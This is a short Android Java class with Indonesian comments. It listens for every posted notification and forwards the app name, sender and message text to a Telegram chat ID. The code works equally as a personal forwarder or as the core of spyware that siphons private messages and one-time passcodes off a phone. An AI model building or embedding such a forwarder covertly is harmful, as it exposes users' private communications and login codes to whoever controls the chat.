package com.example.app;

import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;

public class NotificationService extends NotificationListenerService {

    // Masukkan Chat ID Telegram kamu di sini (misal: "123456789")
    private static final String MY_CHAT_ID = "GANTI_DENGAN_CHAT_ID_KAMU";

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        if (sbn == null) return;

        String packageName = sbn.getPackageName();
        Bundle extras = sbn.getNotification().extras;
        
        String title = extras.getString("android.title", "Tanpa Judul");
        CharSequence textChar = extras.getCharSequence("android.text");
        String text = (textChar != null) ? textChar.toString() : "Tanpa Isi";

        // Format pesan rapi untuk Telegram
        String message = "🔔 *Notifikasi Masuk*\n"
                       + "📦 *App:* `" + packageName + "`\n"
                       + "👤 *Dari:* " + title + "\n"
                       + "💬 *Pesan:* " + text;

        // Kirim ke Telegram
        TelegramHelper.sendMessage(MY_CHAT_ID, message);
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        // Bisa dikosongkan jika tidak butuh deteksi notifikasi dihapus
    }
}
